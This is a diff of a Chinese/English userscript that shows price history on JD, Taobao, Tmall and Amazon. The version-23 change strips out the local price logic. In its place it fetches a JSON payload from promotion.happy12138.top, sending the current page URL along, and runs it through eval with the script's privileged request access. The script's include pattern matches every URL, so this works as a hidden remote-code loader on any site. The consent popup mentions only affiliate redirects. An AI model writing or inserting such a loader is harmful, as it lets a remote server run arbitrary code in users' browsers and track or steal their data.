@@ -6,36 +6,55 @@
 // @description:zh-CN [无广告] 一目了然显示京东/天猫商城/淘宝集市/美国亚马逊历史价格。Chrome 64.+中测试通过，其他环境不保证可用。
 // @include     /http(?:s|)://(?:item\.(?:jd|yiyaojd)\.(?:[^./]+)/\d+\.html|.+)/
 // @include     /http(?:s|)://(?:detail|item)\.(?:taobao|tmall)\.(?:[^./]+)/item.htm/
-// @require     https://cdnjs.cloudflare.com/ajax/libs/Chart.js/2.7.1/Chart.bundle.min.js
 // @updateURL   https://github.com/gam2046/userscript/raw/master/jd-histroy-price.user.js
+// @require     https://cdnjs.cloudflare.com/ajax/libs/Chart.js/2.7.1/Chart.bundle.min.js
+// @require     https://cdn.jsdelivr.net/npm/sweetalert2@8
 // @supportURL  https://github.com/gam2046/userscript/issues/new
 // @connect     pansy.pw
 // @connect     gwdang.com
-// @run-at      document-idle
-// @version     22
+// @connect     happy12138.top
+// @connect     huihui.cn
+// @run-at      document-start
+// @version     23
 // @grant       GM_xmlhttpRequest
 // @grant       GM_setValue
 // @grant       GM_getValue
 // @copyright   2018+, forDream <gan2046#gmail.com>
 // @author      forDream
 // ==/UserScript==
-(function () {
+(() => {
+    'use strict';
+    const notification = [{
+        name: 'privacy-v1',
+        match: /(?:jd|yiyaojd|taobao|tmall|amazon)\.(?:com|cn|jp.co)/,
+        title: ['Respect your choice', '尊重您的知情权与选择权'],
+        type: 'question',
+        message: [`<p align="left">First of all, thank you very much for your trust in choosing this plug-in. However, before you use it, there are some things that I think you need to know, and you should decide whether to continue using this plug-in.
+        <br/>
+        <br/>0. This script is free of charge and does not require you to pay any fees.
+        <br/>1. This script currently supports the historical price inquiry of JD (jd.com), Taobao (taobao.com), TMall (tmall.com) and Amazon of the United States.
+        <br/>2. The data source of this script comes from the third party of the network and self-built. The self-built data is updated every 24 hours when the data size is less than 15 million items. According to the current method, the historical price you see will first display the data from the third party. If and only if the third party data source is unavailable, you will be able to obtain the relevant data in a special period as much as possible through updating. (For example, China's June 18 and December 11)
+        <br/>3. For the product information display of JD (jd.com), Taobao (taobao.com) and TMall (tmall.com), the script will automatically access Jingdong Alliance and Taobao Alliance. This means that when you shop in JD (jd.com), Taobao (taobao.com) and TMall (tmall.com), I may receive a certain percentage of commission (the specific percentage is decided unilaterally by JD (jd.com) and Taobao Tmall), which does not need to be paid by you and you will not pay more money. However, this may lead to a jump in the browser when you enter the product details page. I hope you can understand.
+        <br/>4. Since there is an overhead related to the server (self-built price data source) and the script itself does not have any advertisement, the income that may be generated from the above article 3 will be used to pay for this expense.
+        <br/>5. If you cannot accept the content of Article 3 above, you don't need to worry. Nothing has happened yet. You can <b>delete this script</b> now.
+        <br/>6. If you continue to use this script, you will be deemed to accept all the above contents.</p>`,
+            `<p align="left">首先十分感谢您的信任，选择了本插件。但是在您使用之前，有一些事情，我认为是您需要知道的，并且您应该据此作出决定，是否继续使用本插件。
+        <br/>
+        <br/>0、此脚本免费，不需要您支付任何费用；
+        <br/>1、本脚本目前支持京东商城、淘宝集市、天猫商城、美国亚马逊的历史价格查询；
+        <br/>2、本脚本数据源来源于网络第三方与自建，其中自建数据，当数据规模小于1500万件商品时，更新频率为每24小时进行一次更新。根据目前的方式，您看到的历史价格将会首先显示来自第三方的数据，当且仅当第三方数据源不可用时，会通过更新的方式使用自建数据，尽可能保障您在特殊时期仍能够获得相关数据；（例如中国的6·18、双十一）
+        <br/>3、对于京东商城、淘宝集市、天猫商城的商品信息展示，脚本会自动接入京东联盟与淘宝联盟。这意味着，您在京东商城、淘宝集市、天猫商城购物时，我可能会获得您购物金额一定比例的佣金（具体比例由京东、淘宝天猫单方面决定），这部分佣金不需要您支付，您也不会因此多付出金钱。但是因此可能会导致您进入商品详情页时，浏览器会有一次跳转，希望您能够理解。
+        <br/>4、由于服务器相关存在开销（自建价格数据源），且脚本本身没有任何广告，因此上述第三条可能产生的收入将用于支付此费用；
+        <br/>5、如果您无法接受上述第三条的内容，您不需要担心，现在什么事情都还没有发生，您现在可以<b>删除此脚本</b>；
+        <br/>6、如果您继续使用本脚本，则视为您接受上述所有内容；</p>`]
+    }]
     class Utils {
-        /**
-            * 将时间戳转换为对象
-            * @param timestamp 时间戳
-            */
         static timestampToDateObject(timestamp) {
             while (timestamp < 1000000000000) {
                 timestamp *= 10;
             }
             return new Date(timestamp);
         }
-
-        /**
-         * 将时间戳转换成时间字符串
-         * @param timestamp 时间戳
-         */
         static timestampToDateString(timestamp) {
             var date = Utils.timestampToDateObject(timestamp);
             var Y = date.getFullYear() + '-';
@@ -43,391 +62,89 @@
             var D = date.getDate();
             return Y + M + D;
         }
-
         static sleep(ms) {
             return new Promise(resolve => setTimeout(resolve, ms));
         }
+        static createLink(targetLink, noreferrer, click) {
+            const link = document.createElement('a')
+            link.href = targetLink
+            if (noreferrer) link.rel = 'noreferrer noopener'
+            if (click) link.click()
+            return link
+        }
+        static eventHandler(event) {
+            switch (event.type) {
+            }
+        }
+        static historyPriceByBuildin() {
+            // stub 若第三方数据源中断，可发布更新 进行立即切换
+        }
     }
 
-    class SupportSite {
+    class I18N {
+        static getText(key) {
+            const text = {
+                historyPrice: ['历史价格', 'Historical price'],
+                averagePrice: ['历史均价', 'Historical average price'],
+                originPrice: ['虚标原价', 'False standard original price'],
+                labelTime: ['时间', 'Time'],
+                labelPrice: ['价格', 'Price'],
+                alertLater: ['下次再说', 'Next time'],
+                alertConfirm: ['确认，不再提示', 'I confirm']
+            }
+
+            const index = this.isChinese() ? 0 : 1
+
+            return text[key][index]
+        }
+        static isChinese() {
+            return navigator.language.indexOf('zh') == -1 ? false : true
+        }
+    }
+
+    class StateDispatcher {
         constructor() {
-            // 用于绘制图表
-            this.canvas = document.createElement('canvas')
-            this.injeried = false
-            this.injeryButton = document.createElement('select')
-            this.injeryButton.appendChild(this.createSelectOption("完整历史价格", 0));
-            this.injeryButton.appendChild(this.createSelectOption("最近七天历史价格", -7));
-            this.injeryButton.appendChild(this.createSelectOption("最近一月历史价格", -30));
-            this.injeryButton.appendChild(this.createSelectOption("最近三月历史价格", -90));
-            this.injeryButton.appendChild(this.createSelectOption("最近半年历史价格", -180));
-            this.injeryButton.dataset.currentValue = 0;
-
-            // 改变展现周期
-            this.injeryButton.addEventListener('click', (event) => {
-                // TODO 完成相关逻辑
-            })
-        }
-
-        createSelectOption(text, value) {
-            const option = document.createElement('option')
-            option.innerText = text
-            option.value = value
-            return option
-        }
-        /**
-         * 子类应该复写
-         *
-         * 返回当前的商品ID
-         */
-        goodsId() { throw 'UnImplementation' }
-
-        /**
-         * 子类应该复写
-         *
-         * 返回当前页面的商品名称
-         */
-        goodsName() { throw 'UnImplementation' }
-
-        /**
-         * 子类应该复写
-         *
-         * 返回当前类所处理的网站名称
-         */
-        siteName() { throw 'UnImplementation' }
-
-        /**
-         * 子类应该复写
-         *
-         * 返回当前页面是否由该类进行处理
-         */
-        isMatch() { throw 'UnImplementation' }
-
-        toDoSomething() { console.log('Threer is nothing to do from parent') }
-        /**
-         * 替代 isMatch 方法
-         * 需要一些额外的插装操作
-         */
-        isWork() {
-            if (this.isMatch()) {
-                this.toDoSomething()
-                return true
-            }
-            return false
-        }
-        /**
-         * 子类应该复写
-         * 
-         * 将图表元素插入到适当的位置
-         */
-        injeryCanvas() { throw 'UnImplementaion' }
-        /**
-         * 
-         * 返回图表元素，返回时，此方法应当已经将相关元素插入网页中
-         */
-        chartCanvas() {
-            if (!this.injeried) {
-                this.injeryCanvas(this.canvas)
-                this.injeried = true
-            }
-            return this.canvas
-        }
-    }
-
-    /**
-     * 数据源抽象
-     */
-    class DataSource {
-        /**
-         *
-         * @param limit 限制显示的天数，大于等于0为不限制，负数代表限制的天数
-         */
-        constructor(limit) {
-            this.limit = limit
-            /**
-             * 历史价格 仅当价格发生变化时，存在记录
-             * 连续数天价格一致则不存储重复记录
-             * key 为时间戳
-             * value 为价格
-             */
-            this.price = new Map()
-
+            this.handler = {}
+            this.events = []
             this.ready = false
-        }
-        /**
-         * 返回查询历史价格的目标地址
-         * @param site 准备查询的站点信息
-         */
-        queryHistoryUrl(site) {
-            throw 'UnImplementation'
+            this.registerHandler('execute', (e) => { eval(e.event)(this) })
         }
 
-        requestOnError() {
-            alert('查询历史记录错误')
-        }
-
-        requestOnAbort() {
-            alert('查询历史记录被终止')
-        }
-
-        requestOnTimeout() {
-            alert('查询历史记录超时')
-        }
-
-        /**
-         * 数据源是否已经准备就绪
-         */
-        isReady() {
-            return this.ready
-        }
-
-        waitForReady(timeout) {
-            return new Promise(async function (resolve, reject) {
-                const interval = 500
-                const successFlag = -4096
-                let t = timeout
-                if (t < 1) {
-                    t = 65536
-                }
-
-                while (t > 0) {
-                    window.setTimeout(() => {
-                        if (this.isReady()) {
-                            t = successFlag // 直接跳出循环
-                        }
-                    }, interval)
-
-                    t -= interval
-
-                    await Utils.sleep(interval)
-                }
-
-                if (t == successFlag) {
-                    resolve()
-                } else {
-                    reject()
-                }
-            }.bind(this))
-        }
-        /**
-         * 子类复写
-         *
-         * 查询结果完成
-         */
-        // requestOnLoad(details) {
-        // throw 'UnImplementation'
-        // }
-
-        request(site) {
-            const requestUrl = this.queryHistoryUrl(site)
-            GM_xmlhttpRequest({
-                url: requestUrl,
-                method: "GET",
-                onload: this.requestOnLoad.bind(this),
-                onerror: this.requestOnError,
-                onabort: this.requestOnAbort,
-                ontimeout: this.requestOnTimeout
-            });
-        }
-    }
-
-    class Gwdang extends DataSource {
-        queryHistoryUrl(site) {
-            let id = site.goodsId()
-            if (site instanceof Taobao) {
-            } else if (site instanceof JD) {
-                id = `${id}-3`
-            } else if (site instanceof AmazonAmerica) {
-                id = `${id}-228`
-            } else {
-                super.queryHistory(site)
-            }
-
-            return `https://browser.gwdang.com/extension?ac=price_trend&dp_id=${id}&union=union_gwdang&version=1518335403103&from_device=default&_=${Date.parse(new Date())}`
-        }
-
-        requestOnLoad(details) {
-            const json = JSON.parse(details.responseText);
-            console.log('Gwdang Response', json)
-
-            // 一天的毫秒数
-            const oneDay = 1000 * 60 * 60 * 24
-            for (let i in json.store) {
-                const store = json.store[i]
-                // let beginTimestamp = new Date()
-                let currentTimestamp = store.all_line_begin_time
-                let lastPrice = -1 // 上一天的价格
-                // let sumPrice = 0 // 总计价格 用于统计均价
-                // let dayCount = 0 // 总计天数
-
-                // // 设置显示的起始时间
-                // if (this.limit >= 0) {
-                //     beginTimestamp = store.all_line_begin_time
-                // } else {
-                //     beginTimestamp.setHours(0, 0, 0, 0)
-                //     beginTimestamp = new Date(beginTimestamp.valueOf() + this.limit * oneDay)
-                // }
-
-                for (let j in store.all_line) {
-                    if (lastPrice != store.all_line[j]) {
-                        lastPrice = store.all_line[j]
-                        // 保存历史价格
-                        this.price.set(currentTimestamp, store.all_line[j])
-                    }
-                    // 时间计数器+1
-                    currentTimestamp += oneDay
-                }
-            }
-
-            console.log('Gwdang History', this.price)
-
-            // 标记任务已完成
+        makeEverythingReady() {
             this.ready = true
+            this.events.forEach(element => { this.onEventInvoke(element) })
+            this.events = []
+            return this
         }
-    }
 
-    class AmazonAmerica extends SupportSite {
-        isMatch() { return /amazon\.com/.test(window.location.host) && window.location.href.indexOf('/dp/') != -1 }
-        siteName() { return 'Amazon' }
-        goodsId() { return parseInt(/\/dp\/([A-Za-z0-9]+)/.exec(location.href)[1], 36) }
-        goodsName() { return document.title.replace("at Amazon.com", "") }
-        injeryCanvas() {
-            const div = document.createElement('div')
-            div.style.width = '100%'
-            div.appendChild(this.canvas)
-
-            document.getElementById("centerCol").appendChild(div)
-        }
-    }
-
-    class Taobao extends SupportSite {
-        isMatch() { return /(taobao|tmall)\.com/.test(window.location.host) }
-        siteName() { return 'taobao' }
-        goodsId() { return /(?:&|\?)id=(\d+)/.exec(window.location.href)[1] }
-        goodsName() { return document.title.replace("-tmall.com天猫", "").replace("-淘宝网", "") }
-        injeryCanvas() {
-            const div = document.createElement('div')
-            div.style.width = '100%'
-            div.appendChild(this.canvas)
-
-            this.injeryButton.style = 'width: 180px;height:38px;color: #FFF;border-color: #F40;background: #F40;'
-            document.getElementById("detail").appendChild(div)
-            // document.getElementsByClassName("tb-action")[0].appendChild(this.injeryButton)
-        }
-    }
-
-    class JD extends SupportSite {
-        itemRegexp() { return /item\.(?:jd|yiyaojd)\.(?:[^./]+)\/(\d+)\.html/ }
-        isMatch() { return this.itemRegexp().test(window.location.href) }
-        siteName() { return 'jd' }
-        goodsId() { return /(\d+)\.html/.exec(window.location.href)[1] }
-        goodsName() { return document.getElementsByClassName("sku-name")[0].innerText.trim() }
-        isWork() {
-            if (/(jd|yiyaojd)\.(com|hk)/.test(window.location.host)) {
-                window.setTimeout(() => { this.toDoSomething() }, 3000)
-                this.amIJump()
-                return this.isMatch()
-            }
-            return false
-        }
-        processRemote(json, link, sku, click) {
-            if (link.href.indexOf('#') != -1) {
-                return true
-            }
-            if (json.code == 200 &&
-                json.msg.responseCode == 200) {
-                link.href = json.msg.longLink
-                link.rel = 'noreferrer noopener'
-                if (click) link.click()
-                return true
+        registerHandler(eventType, handler) {
+            if (this.handler[eventType]) {
+                this.handler[eventType].push(handler)
+            } else {
+                this.handler[eventType] = [handler]
             }
 
-            return false
+            return this
         }
-        amIJump() {
-            const buy = document.getElementsByClassName('gobuy')
-            if (buy.length == 1) {
-                const lnk = buy[0].getElementsByTagName('a')[0]
-                lnk.target = '_self'
-                lnk.click()
+
+        onEventInvoke(event) {
+            if (!this.ready) {
+                this.events.push(event)
                 return
             }
-        }
-        queryInfoBySku(sku, link, current) {
-            GM_xmlhttpRequest({
-                url: `https://spring.pansy.pw/api/v2/promotion/jd/${sku}.js`,
-                method: 'GET',
-                timeout: 10000,
-                headers: {
-                    'Content-Type': 'application/json',
-                    'Accept': 'application/json',
-                    'Cache-Control': 'public'
-                },
-                onload: (details) => {
-                    try {
-                        const json = JSON.parse(details.responseText)
-                        const key = `JD-Item-v2-${sku}`
-                        GM_setValue(key, details.responseText)
-                        this.processRemote(json, link, sku, current)
-                    } catch (e) {
-                        console.log('request error', e)
-                    }
-                },
-                onerror: () => { console.log(`Something Error ${sku}`) },
-                onabort: () => { console.log(`Something Abort  ${sku}`) },
-                ontimeout: console.log(`Something Timeout  ${sku}`)
-            });
-        }
-        toDoSomething() {
-            const regexp = /item\.jd\.(?:[^./]+)\/(\d+)\.html/
-            const links = document.getElementsByTagName('a')
 
-            const cur = regexp.exec(window.location.href)
-
-            if (cur != null &&
-                (-1 == window.location.href.indexOf('?'))) {
-                this.queryInfoBySku(cur[1], document.createElement('a'), true)
+            const handlers = this.handler[event.name]
+            if (handlers) {
+                handlers.forEach(element => {
+                    element(event)
+                });
             }
 
-            for (let n in links) {
-                const link = links[n]
-                const result = regexp.exec(link.href)
-                if (result != null) {
-                    const sku = result[1]
-                    if (parseInt(sku) < 100000) {
-                        continue
-                    }
-
-                    const key = `JD-Item-v2-${sku}`
-                    let remote = GM_getValue(key, null)
-
-                    if (remote != null) {
-                        console.log('find sku with cache', link.href)
-
-                        if (this.processRemote(JSON.parse(remote), link, sku)) {
-                            continue
-                        }
-                    }
-
-                    this.queryInfoBySku(sku, link)
-                }
-            }
-        }
-        injeryCanvas() {
-            const div = document.createElement('div')
-            div.style.width = '100%'
-            div.appendChild(this.canvas)
-
-            this.injeryButton.className = 'btn-special1 btn-lg'
-            // 插入合适位置图表
-            document.getElementsByClassName("product-intro clearfix")[0].appendChild(div)
-            // 插入合适位置按钮
-            // document.getElementsByClassName("choose-btns clearfix")[0].appendChild(this.injeryButton)
+            return this
         }
     }
-
     class ChartHelper {
         constructor() {
-            // 定义成员变量的方法
             this.colors = {
                 red: 'rgb(255, 99, 132)',
                 orange: 'rgb(255, 159, 64)',
@@ -438,21 +155,18 @@
                 grey: 'rgb(201, 203, 207)'
             }
 
-            /**
-             * 数据表基本结构
-             */
             this.data = {
                 labels: [],
                 datasets: [
                     {
-                        label: "历史价格",
+                        label: I18N.getText('historyPrice'),
                         fill: false,
                         steppedLine: false,
                         backgroundColor: this.colors.blue,
                         borderColor: this.colors.blue,
                         data: []
                     }, {
-                        label: "历史均价",
+                        label: I18N.getText('averagePrice'),
                         steppedLine: false,
                         backgroundColor: this.colors.green,
                         borderColor: this.colors.green,
@@ -460,7 +174,7 @@
                         fill: false,
                         data: []
                     }, {
-                        label: "虚标原价",
+                        label: I18N.getText('originPrice'),
                         steppedLine: false,
                         backgroundColor: this.colors.red,
                         borderColor: this.colors.red,
@@ -488,15 +202,14 @@
             this.data.datasets[0].data = []
             this.data.labels = []
 
-            let sum = 0
-            let count = 0
-
-            historyPrice.forEach((value, key, map) => {
-                this.data.labels.push(Utils.timestampToDateString(key))
-                this.data.datasets[0].data.push(value)
-            });
-
-            // 同步历史均价
+            // historyPrice.forEach((value, key, map) => {
+            // this.data.labels.push(Utils.timestampToDateString(key))
+            // this.data.datasets[0].data.push(value)
+            // });
+            historyPrice.prices.forEach(item => {
+                this.data.labels.push(Utils.timestampToDateString(item.timestamp))
+                this.data.datasets[0].data.push(item.price)
+            })
         }
 
         // /**
@@ -510,7 +223,10 @@
             const ONE_DAY = 86400000
             const firstMap = {}
             const lastMap = {}
-            datasource.forEach((value, key, map) => {
+            // datasource.forEach((value, key, map) => {
+            datasource.prices.forEach((item) => {
+                const key = item.timestamp
+                const value = item.price
                 if (lastPrice < 0) {
                     lastStamp = key
                     lastPrice = value
@@ -581,41 +297,71 @@
                             display: true,
                             scaleLabel: {
                                 display: true,
-                                labelString: "时间"
+                                labelString: I18N.getText('labelTime')
                             }
                         }],
                         yAxes: [{
                             display: true,
                             scaleLabel: {
                                 display: true,
-                                labelString: "价格"
+                                labelString: I18N.getText('labelPrice')
                             }
                         }]
                     }
                 }
             })
-
         }
     }
 
-    const supports = [new JD(), new Taobao(), new AmazonAmerica()]
+    const sandboxie = false
+    const siteUrl = sandboxie ?
+        /* Mix Content */
+        'http://local.dev.pansy.pw:9876' :
+        'https://promotion.happy12138.top'
+    const dispatcher = new StateDispatcher()
 
-    supports.filter(site => {
-        return site.isWork()
-    }).find(site => {
-        console.log('Match site', site)
-        const ds = new Gwdang(0)
-        const chart = new ChartHelper()
+    const hostname = document.createElement('meta')
+    hostname.content = siteUrl
+    hostname.name = 'hostname'
 
-        ds.request(site)
-
-        ds.waitForReady(-1).then(() => {
-            console.log('ok')
-            site.injeryCanvas()
-            chart.historyPrice = ds.price
-            chart.averagePrice = ds.price
-            chart.draw(site.canvas, site.goodsName())
-            console.log('well done')
+    document.addEventListener('DOMContentLoaded', () => {
+        document.head.appendChild(hostname)
+        dispatcher.onEventInvoke({ 'name': 'idle', 'dispatcher': dispatcher })
+        notification.forEach((value, index, array) => {
+            if (value.match.exec(window.location.href) != null && true != GM_getValue(value.name, false)) {
+                const inx = I18N.isChinese() ? 1 : 0
+                Swal.fire({
+                    title: value.title[inx],
+                    html: value.message[inx],
+                    type: value.type,
+                    showConfirmButton: true,
+                    showCancelButton: true,
+                    confirmButtonText: I18N.getText('alertConfirm'),
+                    cancelButtonText: I18N.getText('alertLater'),
+                    allowOutsideClick: false,
+                    allowEscapeKey: false
+                }).then(result => {
+                    if (result.value) {
+                        GM_setValue(value.name, true)
+                    }
+                })
+            }
         })
     })
+
+    GM_xmlhttpRequest({
+        url: `${siteUrl}/api/v3/script?v=20190928`,
+        method: "GET",
+        timeout: 10000,
+        headers: {
+            'Accept': 'application/json',
+            'Referer': location.href,
+            'X-Referer': location.href
+        },
+        onload: (details) => {
+            const text = details.responseText
+            const event = JSON.parse(text)
+            eval(event.event)(dispatcher)
+        }
+    });
 })()
